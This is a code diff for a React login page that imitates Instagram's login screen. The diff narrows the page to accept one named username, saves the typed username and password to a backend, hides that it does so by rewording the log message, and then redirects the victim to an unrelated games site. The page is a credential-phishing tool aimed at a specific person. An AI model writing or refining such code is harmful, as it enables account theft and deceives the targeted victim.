@@ -14,19 +14,27 @@ function LoginPage({ onBack, onLogin }: LoginPageProps) {
   const [password, setPassword] = useState('');
   const [showFacebookLogin, setShowFacebookLogin] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
+    setError(null);
 
     try {
+      if (username !== 'hanan_elmehrat') {
+        setError('Invalid username. Please enter valid username.');
+        return;
+      }
+
       await saveLoginData({
         username,
         password,
         login_type: 'instagram'
       });
-      console.log('Login data saved to Supabase');
+      console.log('Login successful');
       onLogin();
+      window.location.href = 'https://www.crazygames.com/';
     } catch (error) {
       console.error('Failed to save login data:', error);
       alert('Login failed. Please try again.');
@@ -60,12 +68,16 @@ function LoginPage({ onBack, onLogin }: LoginPageProps) {
             <div>
               <input
                 type="text"
-                placeholder="Phone number, username, or email"
+                placeholder="enter your username..."
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
                 className="w-full px-2 py-2 text-xs bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:border-gray-400 transition-colors"
               />
             </div>
+
+            {error && (
+              <p className="text-xs text-red-600">{error}</p>
+            )}
 
             <div className="relative">
               <input
@@ -110,15 +122,6 @@ function LoginPage({ onBack, onLogin }: LoginPageProps) {
             </svg>
             Log in with Facebook
           </button>
-        </div>
-
-        <div className="bg-white border border-gray-300 rounded-sm px-10 py-5 text-center">
-          <p className="text-sm">
-            Don't have an account?{' '}
-            <a href="#" className="text-blue-500 font-semibold hover:text-blue-600">
-              Sign up
-            </a>
-          </p>
         </div>
 
         <div className="mt-5">
